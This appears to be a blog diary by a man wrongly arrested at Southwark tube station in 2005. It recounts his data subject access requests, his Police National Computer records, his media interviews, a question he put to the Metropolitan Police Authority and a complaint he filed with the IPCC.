I also have not received any formal apology or any compensation .
And of course no assurance that other innocents wo n't be arrested in similar circumstances .
It 's also just a month since I wrote to my Member of Parliament .
I have n't received a reply ( yet ) .
Ironically she is a human rights lawyer .
I decided to check on the Royal Mail website when the four subject access requests I sent on 2005 - 08 - 31 to various Data Protection Registrars ( DPRs ) were received .
The ones to Transport for London and British Transport Police were received on 2005 - 09 - 02 .
The Royal Mail site has no track record of delivery of the letters to the London Underground or the Metropolitan Police DPRs .
As I received a reply from the Met , I know that this letter has been delivered !
So that leaves the one to London Underground .
Either the London Underground DPR did get the letter at the same time as the other DPRs and is now in breach of the Data Protection Act or the Royal Mail has managed to lose one recorded delivery letter .
It 's not yet forty days since I last got correspondence from the British Transport Police and the Metropolitan Police ( and the Transport for London DPR wrote back explaining that its data retention period is only 14 days ) .
On 2005 - 09 - 21 , it was widely reported that Scotland Yard had scrutinised footage from 80,000 CCTV tapes going back to at least June 28 .
That 's a retention period for CCTV footage of at least twelve weeks .
None of the press reports have stated whether this is normal Police procedure ( data retention ) or whether this was an exceptional measure for the investigation in progress ( data preservation ) .
I am interviewed on 2005 - 10 - 21 by John Sudworth for the BBC Radio Four programme Broadcasting House presented by Fi Glover .
My interview ( 1.5 MB ) is used as part of an extensive segment ( from 17 ' 52 " to 31 ' 15 " in the full programme – not online anymore ) on the misuse of Section 44 of the Terrorism Act ( Stop and Search ) , broadcast on Sunday 2005 - 10 - 23 at 9am .
I just came back from two weeks holidays in Asia .
Going through passport control went fine except for immigration officers checking my passport in minute details .
Coming back to the UK , at Heathrow , the officer even took a magnifier from his pocket to check the page with the picture .
I presume this is more to do with the fact that I still have an old style non machine readable passport , than anything on file .
No question asked .
I received the Subject Access from the Met .
It is dated 2005 - 10 - 23 .
It contains ‘ information that may be held about [ me ] by the Metropolitan Police on computers in the following categories :- Person Record : Prosecution / Conviction ’.
There 's no category section in the Met DPR entry , but I presume it corresponds to ‘ Purpose 2 ’ [ update : the link to the entry – www.esd.informationcommissioner.gov.uk/esd/DoSearch.asp?reg=2789622
– is now dead and I cannot find the new DPR entry for the Met. the registration number is Z4888193 ] .
Are there any other interesting categories one should explicitly ask for ?
The cover letter does mention : ‘ If you requested any categories not shown above the Metropolitan Police will send you a separate reply . ’
When I was interviewed , the officer had an exact list of all the addresses I lived at in the UK .
Surely this must be on the PNC – in another category ?
Ditto the fact that I did have a press card registered with Scotland Yards many years ago ?
Information listed includes ( terms used in the document ) :
PNC Response Recorded : 23/10/05
Nominal details : surname , forename , birth date , sex , colour , ethnic appearance and height
Intelligence information : photo locations
DNA report summary
Impending prosecutions full details : fingerprints status , officer in case ( deleted as it ‘ identifies another person ’ ) , name and date of birth given and details of arrest :
Arrested at 20:43 hrs on 28/07/05 Public nuisance Common Law Offence originator : 01MD Offence date(s ) / Time(s ) : 28/07/05 20:30 Offence address : Southwark L.T Tube Station . , Southwark , London , Post code : SE1 Committed on bail : No Court ref : Not yet fixed Prosecuting agent : Police Court :
Not yet fixed Date :
Not yet scheduled
Date of creation : 29/07/05
This confirms that the Police keep PNC records of innocents that have been wrongly arrested .
The detail is is also cause of some concern and further questions :
It mentions that I was arrested for Public Nuisance under Common Law .
Does ‘ Common Law ’ includes the Terrorism Act ?
If not , the Police did n't record on paper what happened .
Of course it may influence their overall statistics .
The officers stated they found my behaviour suspicious ( the offence ) when I was entering the tube station – at 19:21 .
The recorded time of the offence is more than an hour later – 20:30 .
Again there 's only mention of the Southwark Tube Station .
This cast further doubt on the ‘ major evacuation of three main line rail stations ’ appearing in the custody record ( only mention of this rather serious statement which appears to have no basement in reality ) .
There 's no mention of the tube station CCTV footage .
Do they have it ?
Should it be recorded on the PNC ?
This PNC entry has not been updated since it was created on 2005 - 07 - 29 .
In particular it has not been updated with the fact that the Police dropped all charges .
Not when I was informed about it on 2005 - 08 - 31 .
Not on 2005 - 10 - 05 – the date printed on the Bail Cancellation Notice I eventually managed to get on 2005 - 10 - 13 .
Not on 2005 - 10 - 23 when the ‘ PNC Response Recorded ’ was created .
The cover letter includes the helpful suggestion : ‘ If you think that the information is incorrect please write to the above address quoting the reference number . ’
As these records cannot be expunged , I 'm keen to at least have the fact the Police dropped the charges added .
I am interviewed live on the Sky News Today television programme at 14:30 .
This is part of the coverage of Tony Blair pushing his plans to let the Police detain terror suspect without charge for up to 90 days .
That the Police ask for more power is expected , but that the Government goes along in asking for laws that would n't be out of place in dictatorships or apartheid - type regime should be of great concern to all .
As I get out of the Sky News studio , Five News is interested to record an interview and we film it in the park outside the studio .
This was planned to be used on the day at 17:30 , but it does n't appear to have been shown during that slot .
With Australia planning new anti-terrorism laws based on the British ones , there 's a sudden strong interest in the failings of the current British laws .
The Australian Financial Review publishes an article on counter - terrorism mentioning what happened to me .
An interview ( 13.2 MB ) with Phillip Adams , I recorded on Monday , is broadcast on ABC Radio National .
This is part of Late Night Live ( from 12 ' 39 " to 24 ' 10 " of the full programme ) .
I am also interviewed ( 8.5 MB ) live as part of Breakfast with Peter Godfrey on Radio Adelaide .
I send an email to my Member of Parliament exactly two months after having written to her at the House of Commons and not having received any reply or acknowledgement .
I meet with Dan Kieran who interviews me for a book he is writing , ‘ a funny journey through some of our oddest laws , pointing out that some modern legislation is just as odd as the old ones but in your case and many others I 've tracked down , far more frightening . ’
In his introduction email , Dan mentioned :
It really would be fantastic to interview you because the best way to make people realise that their personal freedom is being eroded away is to tell your story because what happened to you really could happen to anyone .
I think , for that reason , it will have a resonance that some of the other stories will not .
Last week I sent another email to my Member of Parliament suggesting I drop in at her open surgery .
Later in the week I got a call from someone working for her who instead arranged a private meeting for today at Portcullis House .
It was a friendly meeting .
She offered support if I do n't get satisfaction from the Police via legal routes but it was otherwise a rather frustrating conversation .
For instance , we discussed the compromises she finds necessary as part of the political system – one such example was her support of the compromise to extend detention of suspects from 14 up to 28 days without charging them ( successfully defeating the 90 days amendment ) .
This even though she practised as criminal barrister .
See Gareth Peirce and Louise Christian 's tales on how even 14 days or less in Paddington Green affect the mental health of detainees .
These are not abstract compromises , the lives of individuals who have not been charged , and hence by definition are innocent , will be deeply affected .
One comment made in passing about this debate , I now find rather shocking : apparently during the Terror Bill debate and vote on the 90 days resolution , there was strong presence of armed police officers around the Parliament that this MP felt was to pressurise the Parliament .
In a democracy , MPs should not feel intimidated by the Police .
A suggestion my MP made was that I talk about my experience to police officers during their training .
I 'd be happy to do so , but I believe the main issues are with the legislation and the public accountability of the Police ( even Sir Ian Blair recognised this in his Dimbleby lecture : ‘ policing is too important to leave to police chiefs – or to party politics alone . ’)
It would be interesting to know if the decision to arrest me was taken by vindictive officers on the scene or by someone higher up the hierarchy possibly not even present at the tube station .
I believe the latter is more likely .
Sir Ian Blair , Metropolitan Police Commissioner , is reported by Bloomberg to have said at the MPA ‘ Together Against Terror ? ’ conference today : ‘ London police have arrested 130 suspects since suicide bomb attacks in July , yet the threat of terrorism continues to increase ’ .
( To contrast , that 's more that all the resultant arrests , whether in connection with terrorism or not , resulting from stop and searches conducted under Section 44 ( 2 ) during the combined financial years 2003 / 4 and 2004 / 5 : the Met arrested 125 persons during this period – apparently . )
That 's 130 arrests just in London from July 7 to December 12 , and I was arrested on July 28 , so the number by then must have been even smaller .
Out of all the people in London they singled out 130 persons and I was one of them .
One would be led to believe that the Met had serious intelligence on these 130 persons , but if the cases of the other 129 are similar to mine then it shows that the Met must work more effectively , not ask for more powers .
The Association of Chief Police Officers just published an Interim practice advice on stop and search in relation to the Terrorism Act 2000 .
On searches authorised under Section 44 , the powers used to stop and search me , the policy note states :
‘ The power is only to stop and search .
This means that there is no power to detain for the purpose of questioning or to ask questions to allay the need for search .
A record of the stop should be given as required by PACE Code A . ’
This explains why I was told I was arrested for suspicious behaviour and public nuisance but only the latter appears on the extract of the custody record I obtained .
If I understand this correctly , I was stopped under one piece of legislation : Section 44 of the Terrorism Act 2000 ; arrested under another : the Terrorism Act was mentioned , but the Police National Computer record states public nuisance offence , Common Law ( which carry a maximum sentence of life imprisonment or a fine or both ) ; and my flat searched under yet another : Section 18 ( 1 ) of the Police and Criminal Evidence ( PACE ) Act 1984 .
I never got a record of the stop , but then it says one ‘ should be given ’ , not one must be given .
Best wishes for the festive season to all who volunteered support , to all this website 's readers – occasional ones , regular ones , and really dedicated ones ( whoever you are on the Government Secure Intranet ! ) – and to everyone contributing to safeguard our civil liberties .
I am interviewed for the Politics Show television programme .
The reporter is interested in how the Stop and search policy works in London .
The filming is done on location where I was arrested last July : Southwark tube station .
( I have since discovered that filming and taking photographs of London tube stations without obtaining a permit in advance is now illegal – the London Underground staff did threaten to call the Police but we moved away to avoid confrontation without realising that we could have been arrested . )
The programme is broadcast on BBC One on Sunday 2006 - 01 - 22 at 12 noon .
The segment of the programme on Stop and search starts with a reenactment of me entering the tube station ; dressed as I was on 2005 - 07 - 28 – and a bit cold .
After some pre-recorded interviews , including mine , there 's a live debate with former Home Office criminologist Professor Marian Fitzgerald visiting professor at Kent University and Bob Neill , Conservative , London Assembly Member and member of Metropolitan Police Association ( I have received two independent confirmations that the MPA requested and obtained – in confidence – a report about my arrest from the Metropolitan Police Service ) .
Professor Fitzgerald mentions that ‘ under the Terrorism Stop and search [ legislation ] , the arrest rate there is only 1 % and very few of these arrests are anything to do with terrorism . ’
In both the Sky News Today and the Politics Show interviews , the caption introduced me as ' Former Suspect ' .
Is that more appropriate than say ‘ London resident ’ or ‘ Tried to take the tube ’ ?
Such captions have to be short , but this shortening of what is really ‘ Formerly considered by the Police to present a suspicious behaviour ’ can give the impression of a universality .
This would erroneous .
Let me know how you react to this label .
I have so far accepted all the invitations from reporters who contacted me ( as the only one of the 130 ‘ suspect ’ arrested in the five months following July 7 to have apparently gone public ) .
I feel it is important as many people as possible are aware of what can and may happen to them – so they can actively ask for and participate in a debate about the society we all live in .
I send two further Subject Access requests to the Met .
This time , I fill in the two forms A & B and send them with a certified copy of my passport , some utility bills and a cheque of twenty pounds .
I specifically ask for information held about me in the PNC – updated to show that I 'm not under arrest any more , a copy of the report about my arrest the Metropolitan Police Service ( MPS ) sent to the independent Metropolitan Police Association ( MPA ) and any other information held about me under any other category ( for instance , I know from the interview that they have a list of all the addresses I lived at in the UK ) .
I take this opportunity to request the list of categories as well .
Someone from the Met calls to enquire about my Subject Access requests .
He wants to know where I had been arrested and to which Police station I had been taken to .
This , even though I had included the PNC Id in my request ( the PNC information includes details of the ‘ offence address ’ ) .
I receive the Subject Access for the following category : ‘ Person Record : Prosecution / Conviction ’ .
The letter and the ‘ PNC Response Recorded ’ are both dated 2006 - 02 - 28 .
The PNC has been updated and now shows the summary of my ‘ non conviction ’ with the ‘ date first non convict ’ and ‘ date last non convict ’ both 2005 - 08 - 31 :
Non convictions summary Non convictions :1 Offences :1
Date first non convict :31/08/05
Date last non convict :31/08/05
Offence summary 1 public disorder offences ( 2005 ) Prosecution agent : Police 1 Court : NFA ( No Further Action ) No court appearance Date :31/08/05 Plea : Not known Adjudication : No adjudication Disposal : NFA
No court appearance
I would have preferred mentions of the arrest to have been deleted , but as this is apparently not possible , at least the PNC now states explicitly that I 'm no more under arrest .
At last I feel I can now stop carrying the Bail Cancellation Notice on me .
Not knowing when the PNC would eventually be updated , I felt safer carrying a proof that the Police had decided to take ‘ no further action ’ .
The cover letter includes the usual : ‘ If you requested any categories not shown above the Metropolitan Police will send you a separate reply . ’
So I 'm expecting to receive further post concerning my other requests .
There are still two more weeks for the regulatory 40 days in which the Met Data Protection Registrar has to answer .
At the end of last year the Metropolitan Police suggested a meeting with a senior officer involved with , possibly even in charge of , the operation that led to my arrest .
I instructed my solicitor that I was keen for this meeting to happen .
I did have one request : that I could record the meeting , and that if the officer refused I still wanted the meeting to happen but was keen for the officer to then provide written reasons why they did n't want me to record anything .
People were busy , then there was the New Year holidays .
Last month , another letter was sent by my solicitor and another 14 days lapsed without a reply from the Police .
This is obviously not happening .
Got the news in the post this morning .
This also means it is the end of the criminal law aspect of my case and my solicitor ( paid by Legal Aid ) is handling me over to a colleague of his dealing with civil law matters such as actions against the police .
The same person from the Met calls again , this time to get the crime reference number ( CRO ) .
I had included this information on the form ( my handwriting may not have been legible ) and it is on the PNC extract I received a week ago .
I receive the remaining Subject Access documents for the requests I made two months earlier on 2006 - 02 - 07 ( I did get an apology letter on 2006 - 03 - 28 for the delay from the Met's Data Protection Officer ) .
The envelope contains a cover letter dated 2006 - 04 - 04 ( explaining that ‘ that under the Act , the data supplied is held by the MPS under the “ Standard Police Notification ” for the Purpose of Policing ’ ) , the relevant Notification ( still no list of categories ) and a ‘ Briefing Note – Arrest of Mr David MERY ’ issued by the Metropolitan Police Service – Southwark .
The briefing note is not dated but it starts with a mention of ‘ Mr Mery has written an article for the Guardian on 22/09/2005 covering the circumstances of his arrest at Southwark Underground Station ’ and finishes with a mention of ‘ the return of the property seized by police ’ so it appears to have been written at the end of October last year ( the MPA had a copy by the beginning of November ) .
It is two and half page long .
Twenty one numbered sections – ‘ information held that can identify a third party , or that you are otherwise not entitled to ’ - have been edited out ( about a quarter of the document ) .
Surprisingly , the name of the Supt that ‘ attended and took command [... and...] formed the view that there were reasonable grounds to suspect an intended [ sic ] by Mr Mery to cause apprehension and fear among the public and officers that he had explosives ’ has not been edited out .
The background section of the report states : ‘ He provides a detailed account of the incident in the Guardian article .
The general chronology of the incident appears correct .
He describes his behaviour , which apparently aroused the officers ' suspicion .
This is generally in line with what was observed by the officers . ’
Even though the MPS agrees at a high - level with my version , there are some disagreements :
‘ It was a bright sunny day with warm temperatures . ’ –
The Met Office disagrees , finding the weather very unsettled for the end of the month and that ‘ London recorded its coldest July day for 25 years on the 27th ’ ( the previous day ) .
– The Met Office disagrees , finding the weather very unsettled for the end of the month and that ( the previous day ) .
There 's no mention that my rucksack was inspected and cleared of containing any explosives .
The only related mention is : ‘ There was some damage to the bag resulting from its examination by the EXPO officers . ’
‘ When he was booked in he made a comment that " no train passed while I was waiting .
I was stopped when the train stopped at the station . " [...]
From the account of officers at the scene it appears that he in fact let a number of trains go through . ’
I still disagree with the Police on this .
The facts can't be checked independently as the cover letter mentions that ‘ the CCTV footage you refer to , is the property of Transport for London ’ and TfL replied to my earlier data subject access that its data retention is fourteen days .
I still disagree with the Police on this .
The facts can't be checked independently as the cover letter mentions that and TfL replied to my earlier data subject access that its data retention is fourteen days .
‘ In interview he indicated that the first trains were not going to the destination he intended to go to .
In his article in the Guardian Mr Mery however stated that he was rushing to meet his girlfriend at Bond Street station .
All trains from Southwark go to Bond Street . ’
This is the first time I see this claim from the Police , I have never said such things and the interview tape can demonstrate it .
Later today , I spot the document Retention Guidelines for Nominal Records on the Police National Computer , incorporating the Step Down Model issued by the ACPO .
According to section 2.5 of this document , I am ‘ referred to as a “ CJ Arrestee ” ’ and according to section 3.1 ‘ [ my ] record will be retained on the PNC until that person is deemed to have attained the age of 100 years of age ’ .
( If I live that long , I 'll have to remember to issue another data subject access on my 100th birthday to check if it is then effectively deleted . )
I pop in the Independent Police Complaints Commission ( IPCC ) and give a filled in complaint form ( dated 2006 - 04 - 17 ) to the reception .
The form asks the ‘ where ? ’ , ‘ when ? ’ , ‘ what ? ’ and ‘ who ? ’ of the incident that led to the complaint .
It does not ask about the specific police misconduct one is complaining about or what outcome the complainant is wishing for .
I presume this is discussed further with the IPCC when the incident is considered serious enough for a complaint to proceed .
I also decide not to proceed any further , at this time , with a civil law solicitor .
A more positive entry on this now long tale on how several helpful individuals have been of great assistance .
Last November , AlistairT , a reader of this page contacted me to let me know he had written to his London Assembly member to ‘ ask what they thought the police were doing and what they were doing to make sure this kind of outrage did n't happen more often . ’
His London Assembly Member Jennette Arnold , also a member of the Metropolitan Police Authority ( MPA ) , replied that the MPA had requested and obtained a full explanation from the police and would continue to monitor the actions of the police as they relate to the Terrorism Act .
With the assistance of Jennette 's team and with another data subject access I managed to get a redacted copy of the briefing note last month .
I eventually met Jennette at her office last Wednesday .
We had a fruitful discussion and she suggested I use my right as a member of the public to put a written question to the MPA .
This had to be done by the next day to be in time for the May 25 full Authority meeting .
I could n't find any guidelines on how such question should be formulated so my first attempt , written Wednesday night , was two - page long and included a mix of personal and more general context .
The MPA helpfully explained that such questions should not be on personal issues and that usually they are no more than a paragraph .
My second attempt is focusing on policing in London and is much shorter ( see next entry )
Beginning of April , KenT , another reader of this page emailed me to suggest I write to Lord Carlile of Berriew QC , the Independent Reviewer of the Terrorism Act 2000 , as he was quoted by BBC News as saying : ‘ People should not be arrested under the Terrorism Act unless there is a real terrorism issue [...]
The most important thing is if there has been an error , then there should be fence - mending at once and it may have to start with an apology ’ .
To my surprise , Lord Carlile replied , on a Sunday , less than an hour after I had emailed him !
He explained that even though individual cases are generally outside his terms of reference , he would attempt to obtain a response from the Home Office to the questions I raised .
Unfortunately the Home Office proved less helpful .
As there are factual issues in dispute between myself and the police , as explained in details in previous entries , Lord Carlile suggested I pursue a complaint via the Independent Police Complaints Commission .
I initiated such a complaint last month .
It does make a positive difference to receive so much support from readers and occasionally from people with some authority .
The agenda for the May 25 MPA full Authority meeting has been published .
It includes the text of my question followed by a proposed response from the Chief Executive and Clerk .
See below for a copy of my question .
The proposed response mentions that the ‘ MPA does not consider the Metropolitan Police Service ( MPS ) to have overreacted to the horrific terrorist attacks [... ] ’
This is obviously an essential disagreement .
On the consultative activities of the MPA , the response starts by mentioning the ‘ Together Against Terror ? ’ conference of last December .
Unfortunately attendance was by invite and the process by which the list was created lacking in transparency .
Before going into generalities , the response mentions that ‘as a result of public feedback , the MPA has secured the agreement of the MPS to publish its statistics on Section 44 ( Terrorism Act 2000 ) stops and searches ’ .
This is most welcome .
Getting these statistics will help getting a better understanding of the wider picture and of the propaganda .
It is unfortunate that the MPS is several months behind in publishing such statistics .
The MPA Standing Orders section 2.7.4 explain that ‘ following the Clerk ’s response , the person asking the question may speak further for no more than three minutes ’ .
I intend to attend .
If you 're interested in the May 25 agenda , the full Authority meetings are open to the public , however this is only to view proceedings and not take part in any of the debate .
Seats are limited so you should arrive before 10.00 am .
You are apparently free to leave the meeting at any stage and do not have to wait until the meeting is finished .
The full Authority meeting of the Metropolitan Police Authority ( MPA ) is an impressive affair with about thirty persons seated at tables arranged as a large rectangle .
Everyone has a name plate and a microphone .
I am in the ' speaker ' chair .
It seems the public consists mostly of assistants to the MPA members and of journalists .
My question is early in the agenda , first item after approving the minutes of the previous meeting .
I briefly introduce myself and refer the audience to my question as printed in the agenda :
‘ To be a Londoner these days is to feel one is considered guilty until proven innocent .
The overreaction of the Metropolitan Police Service ( MPS ) to the horrific terrorist attacks of last July has resulted in many innocent Londoners suffering from the long - term effects of having been arbitrarily detained and / or arrested .
Another consequence of this worsening policing of London is intimidation , increased mistrust and even fear of the MPS .
This has not enhanced our security , to the contrary .
What is the MPA doing to ensure that police powers are more balanced and checked so they are not further abused against innocents Londoners ?
Is the MPA actively consulting with the innocent Londoners that have been arrested and released without further action ?
What actions are taken by the MPA so that Londoners can stop being paranoid about which aspect of our behaviour or clothing , or which picture we take will be used as an excuse for detainment , arrest or shooting by the MPS ?
How does the MPA plan to restore trust in the police ? ’
The response from the Chief Executive and Clerk is read .
The final response is the same as the proposed one that was published in the agenda :
‘ The Metropolitan Police Authority ( MPA ) is fully committed to the principle of innocence until proven guilty .
The MPA is also acutely aware of the need to strike a balance between robust counter - terrorist policing , the protection of fundamental civil liberties , and the maintenance of public trust and confidence in the police .
The MPA does not consider the Metropolitan Police Service ( MPS ) to have overreacted to the horrific terrorist attacks which killed 52 innocent people in London on 7 July 2005 and the attempted bombings a fortnight later .
The MPS responded with the seriousness that these acts of indiscriminate murder demanded .
Notwithstanding the tragic death of Jean - Charles de Menezes on 22 July 2005 , the MPS response in terms of both disaster - management and investigation has drawn respect and recognition from around the world .
A MORI survey in September 2005 suggested that 86 % of Londoners believe that the MPS responded well to the attacks .
Recognising the potential which Londoners themselves have to contribute to the safety and security of the capital , the MPA has undertaken to deliver a series of consultative activities in the field of counter - terrorism .
The first of these activities was the MPA's ’ Together Against Terror ? ’ conference in December 2005 , attended by over 150 community members .
Planned activities in 2006 include a series of public hearings , focus groups in universities and colleges , and local consultation in all 32 London Boroughs .
The MPA consults Londoners in order to understand what the public expect from the police .
It does then respond to their views .
For example , as a result of public feedback , the MPA has secured the agreement of the MPS to publish its statistics on Section 44 ( Terrorism Act 2000 ) stops and searches .
Separate arrangements , defined by statute , are in place for dealing with public complaints and specific allegations of police misconduct .
The MPA works closely with the MPS and the Independent Police Complaints Commission ( IPCC ) to ensure that complaints against the police are handled properly .
In counter - terrorism , as in all other fields of policing , the MPA remains committed to securing an effective , efficient and fair police service for all of London 's communities . ’
As the MPA 's response is the one that was published , the response to the response I had prepared is fully valid and I read through my notes , hopefully in the allotted three minutes :
As ‘ The Metropolitan Police Authority ( MPA ) does not consider the Metropolitan Police Service ( MPS ) to have overreacted to the horrific terrorist attacks ’ of last July 2005 , and that ‘ the MPS response in terms of both disaster - management and investigation has drawn respect and recognition from around the world ’ we have an essential disagreement .
If the MPA finds the MPS is doing a perfect job in respect to its anti-terrorism response then a discussion on how it can be improved is not possible .
This satisfaction can not be shared by all Londoners when there are so many stop and searches under Section 44 ( 2 ) of the Terrorism Act 2000 , and subsequent arrests of innocent Londoners .
This does not make us any more secure but does impact the lives of Londoners .
Even Sir Ian Blair , the Metropolitan Police Commissioner , appears to disagree with MPA 's assessment .
He is reported by Bloomberg to have said at the MPA 's own ' Together Against Terror ? ' conference last December : ‘ London police have arrested 130 suspects since suicide bomb attacks in July , yet the threat of terrorism continues to increase ’.
That 's more than all the arrests , whether in connection with terrorism or not , resulting from stop and searches conducted under Section 44 ( 2 ) during the combined financial years 2003 / 4 and 2004/ 5 ( the Met arrested 125 persons during this period according to the Statistics on Race and the Criminal Justice System ) .
And that 's only for five months .
Former Home Office criminologist and visiting professor at Kent University , Professor Marian Fitzgerald mentioned on BBC One , on 22 January 2006 , that ‘ under the Terrorism Stop and search [ legislation ] , the arrest rate there is only 1 % and very few of these arrests are anything to do with terrorism . ’
This shows that that the MPS must work more effectively with more intelligence instead of stopping , searching and arresting Londoners , without reasonable cause , on the basis of a stereotypical profiling .
How can the MPA be satisfied that the MPS keeping DNA samples , fingerprints and palm prints of innocents forever , and PNC records , including mentions of non-conviction , until the Londoner reaches 100 years old increases our security .
The MPA is to be commended on getting the MPS to publish statistics such as the Statistics on Race and the Criminal Justice System .
May I suggest the MPA puts further pressure on the MPS for the statistics to be published earlier and to include the number of arrestees being tried and how many are convicted .
The MPA's ' Together Against Terror ? ' conference was I 'm sure a very interesting .
It is unfortunate that its existence was announced by a press release only three days earlier and that the selection of the over 150 ( 100 in the press release ) community members has not been open and transparent .
I could n't find transcripts or videos of the event , either .
Hopefully lessons have been learned from organising this event and the forthcoming events will be more open to Londoners .
I am disappointed that your response has not convinced me that ‘ in counter - terrorism , as in all other fields of policing , the MPA remains committed to securing an effective , efficient and fair police service for all of London 's communities . ’
According to MPA 's standing orders , members may also comment on or discuss the issues raised by the question and answer .
In addition to the Chair , three members take this opportunity and are on the whole more favourable with the issues I raised than the rather generic answer from the Chair :
The Chair corrects the fact that some transcripts from MPA's ' Together Against Terror ? ' conference are available here and here , and otherwise reiterates that stop and search is just one of tactics at the disposal of the police and that ' we can't rule out any tactic ' .
The Chair also refutes my argument that stop and searches happen on the basis of a stereotypical profiling , arguing that there 's no profiling : all races are likely to be stopped and searched ( but possibly one faith ) .
Independent member John Roberts , Chair of the Stop & Search Scrutiny Board , offers to meet up at a later date .
London Assembly member Jenny Jones is grateful that my question was asked and comments further that it is a balancing act between civil liberties and security .
London Assembly member Jennette Arnold , who suggested I send a question to the MPA in the first place , reminds everyone that my question only scratches the surface about the experience innocent Londoners face when being caught up in such circumstances .
The Chair concludes this agenda item pointing out that he would n't want anyone to think the MPA is a soft touch when some people lose their life .
I leave the ' speaker ' chair and move to one a the few remaining free chairs reserved for the public .
My notes are far from extensive and are here just to give a flavour of the discussion .
The minutes published by the MPA have even less details .
Be sure to check these out as they 'll most probably have more details on the comments to my questions and other interesting information ( such that it took 78 officers – more than has been reported so far by the press – six hours at a cost of £ 7,500 [ apparently Sir Ian Blair misled the MPA and the cost is in fact £ 27,754 ] to seize Brian Haw 's placards ; and also an interesting discussion on the increased number of young Londoners carrying knives and the rise of knife crimes . )
Last week I received a letter from the Independent Police Complaints Commission ( IPCC ) acknowledging receipt of my complaint form .
The casework manager looking after my case has ‘ referred the matter to the Professional Standards Department of the Metropolitan police for consideration ’ and the police should be contacting me in about a month .
The Independent Police Complaints Commission ( IPCC ) casework manager looking after my complaint form calls to inform me that it was considered my complaint is serious enough to warrant the IPCC to supervise the investigation by the Internal Investigations Commands ( IIC ) , Directorate of Professional Standards ( DPS ) of the Metropolitan police .
Today , the Report on the operation in 2005 of the Terrorism Act 2000 by Lord Carlile of Berriew Q.C. is published by the Home Office .
One of the point made by this report with which I am in full agreement :
‘ Terrorism related powers should be used for terrorism related purposes ; otherwise their credibility is severely damaged . [...]
In a diverse community the erroneous use of powers against people who are not terrorists is bound to damage community relations . ’
Lord Carlile includes a list of 86 ‘ persons and organisations seen and / or involved in consultations and activities and correspondence ’ and is welcoming further relevant information :
‘ However , there is a steady increase in the number of informal contacts and suggestions I receive from members of the public .
They are sometimes of real value , and I welcome them all .
I do not offer any kind of appeal procedure for individual cases .
However , I do read some documents referring to individual cases , and I do ask questions about them and can offer advice and comments .
I am particularly anxious to obtain the assistance of more members of the public who have had some contact with the TA2000 , whether as observers , witnesses , persons made subject to powers given under the Act or as terrorist suspects .
It is not always as easy as one would wish to make contact with those who have had these real - life experiences .
Anyone wishing to provide me with information is very welcome to do so by writing to me at the House of Lords , London SW1A 0 PW or sending me information via the Internet on carlileqc@aol.com . ’
I meet John Roberts , Chair of the Stop & Search Scrutiny Board at the Metropolitan Police Association ( MPA ) .
This was agreed when I asked my question to the MPA .
I learn that this board has recognised some issues with Stop & Search and has addressed them primarily through Police training ( some officers had their initial training long before Stop & Search came into existence ) and public education ( close to 60,000 thousands leaflets have been distributed ) .
The former initiative is aimed at improving the standard of Stop & Searches while the latter aims to inform the public of its rights .
I suggest complementing this , within the small budget available , with online participation in political blogs and online communities frequented by young Londoners ( if you are under 26 years old , you are more likely to be stopped and searched ) .
One concern I have is that this board 's remit is Stop & Search under PACE , hence Stop & Search under Section 44 of the Terrorism
Act is not its focus .
This explains why not much effort has been spent finding ways to reduce or even eliminate the long term negative impacts of Stop & Search especially when it leads to an arrest as in my case .
Another aspect I believe could still be improved is getting more feedback on Londoner 's experience with this tactic as there are apparently very few complaints being made ( and John Roberts has explored the possibility of proactively seeking feedback ; this is made difficult by the fact that many name and addresses given are apparently invalid ) .
I should receive more documentation on some of the results of this board .
Later in the day I get a call from the Investigating Officer , a Detective Inspector , tasked with my complaint against the Police .
He explains that I have four options : a/ complaint logged on file ( and not pursued ) , b/ complaint made ( and explanation of the police action obtained ) , c/ full investigation and d/ local resolution .
We agree that the first two options are inappropriate .
For the latter two options , the procedure will start with the Investigating Officer taking a statement from me .
From the discussion , my understanding of the last option is that the statement is brought to the police officers involved , for them to respond to the allegations .
A record of this is made to their file , and the result is communicated back to me .
At this stage , I am unclear as to which option is most appropriate .
After reading more information , such as Part 2 of the Police Reform Act 2002 , an Independent Police Complaint Commission ( IPCC ) leaflet on what to expect when a complaint is dealt with by Local Resolution and part of another one for the Police , I am getting even more confused as these documents do n't seem to fully match my recollection of the earlier phone conversation .
The Investigating Officer should call me early next week .
By then I need to make a decision as to which option is most appropriate and start working on my statement .
I will be seeking guidance from the IPCC .
At a very broad level , actions I 'd like taken are : getting a formal and public apology ; obtain the rank , and name if possible , of the officer that decided to arrest me , getting a complete list of all the data and records the Police has on me ; get a copy of all that I can have a copy of ; have all that can be deleted and expunged , destroyed ; get explanations of the inaccuracies and inconsistencies in the little information I got from the police ...
My motivation is part obtaining reparation and part helping ensure no - one else has to go through the same ordeal , again .
The Investigating Officer mentioned that to get a list all the Police has on me ( and I know they have information not listed in the data subject access I obtained ) I would need to separately issue a request under the Freedom of Information Act .
He also offered to ‘ apologise now on behalf of the Police if I feel I was mistreated ’ .
It was a nice gesture , but I am after an apology for the actions of the Police ( the unnecessary and possibly unlawful stop and search , arrest , search of my flat , seizure of property , etc. ) not for how I feel .
I receive a letter from the Detective Sergeant ( DS ) that has been appointed to deal with my complaint ( on behalf of the Detective Inspector that initially contacted me ) .
The letter confirms that my ‘ complaint has been formally recorded ’ ( on 2006 - 06 - 28 ) and also expresses that they 're keen to ‘ progress this enquiry in an expeditious manner ’ .
This seems to be very much the case as I got a call on Tuesday and another one this morning to check on my progress .
Following last week 's explanations by the Detective Inspector ( DI ) , I got in touch with the IPCC .
Unfortunately , the caseworker explained that the IPCC cannot offer guidance on how to proceed in a complaint procedure and suggested I seek legal assistance .
Last Sunday
I emailed a solicitor firm known for its strong experience with actions against the Police .
I got called back on Wednesday by a solicitor who suggested that with all the documentation I had accumulated on this site I could prepare a statement on my own without the need to pay for a solicitor 's time .
She volunteered very clear explanations on what I need to do .
Another really nice and helpful person !
I have decided that a full investigation ( option c ) is the most appropriate option for my complaint and have started work on a draft statement .
I agree to meet next Wednesday the Detective Constable ( DC ) taking over from the DS while he 's on holidays .
As the Internal Investigations Commands ( IIC ) , Directorate of Professional Standards ( DPS ) of the Metropolitan Police is in Norbury we decide we 'll meet up at Southwark Police station instead .
My understanding is that the sole objective of this meeting is to go through my statement .
The DC will then start the full investigation and keep both the IPCC and myself informed of the progress of the investigation .
Today marks the first anniversary of the horrific terrorist attacks on the tube and bus system in London .
Our thoughts go out to the victims of the atrocity , their families and friends .
Demand a public inquiry into the July 7th 2005 London bombings .
If you have n't done so yet , sign the petition .
See below for some other suggestions on what you can do .
I arrive at Southwark Police station just before 1 pm .
